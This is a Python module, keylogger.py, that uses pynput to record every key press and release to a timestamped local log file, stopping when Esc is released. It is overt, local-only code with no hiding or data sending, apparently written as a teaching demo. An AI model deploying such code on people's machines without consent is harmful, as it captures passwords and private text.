# keylogger.py

# This file contains the core logic for capturing and logging keystrokes.

from pynput import keyboard
import logging
from config import LOG_FILE

class KeyLogger:
    """
    A class to handle keyboard event logging.
    It sets up a listener and logs key presses and releases.
    """
    def __init__(self):
        """
        Initializes the KeyLogger, setting up the logging configuration.
        """
        # Set up logging to write to the specified file
        # The format includes timestamp, log level, and the message
        logging.basicConfig(filename=LOG_FILE, level=logging.INFO,
                            format='%(asctime)s: %(message)s')
        self.logger = logging.getLogger() # Get the root logger

    def _on_press(self, key):
        """
        This function is called when a key is pressed.
        It logs the key press event.
        """
        try:
            # Log the alphanumeric key pressed
            self.logger.info(f"Key pressed: {key.char}")
        except AttributeError:
            # Log special keys (e.g., Space, Enter, Shift)
            # Convert the key to a string for logging
            self.logger.info(f"Special key pressed: {str(key)}")

    def _on_release(self, key):
        """
        This function is called when a key is released.
        It logs the key release event and stops the listener if 'esc' is pressed.
        """
        self.logger.info(f"Key released: {str(key)}")
        # If the 'esc' key is released, stop the listener
        if key == keyboard.Key.esc:
            print("\nExiting keystroke capture. Check the log file for output.")
            # Stop listener by returning False
            return False

    def start_listener(self):
        """
        Starts the keyboard listener.
        """
        # Create a listener for keyboard events
        # It calls _on_press when a key is pressed and _on_release when a key is released
        with keyboard.Listener(on_press=self._on_press, on_release=self._on_release) as listener:
            # Join the listener thread to the main thread
            # This keeps the script running until the listener is stopped (e.g., by pressing 'esc')
            listener.join()
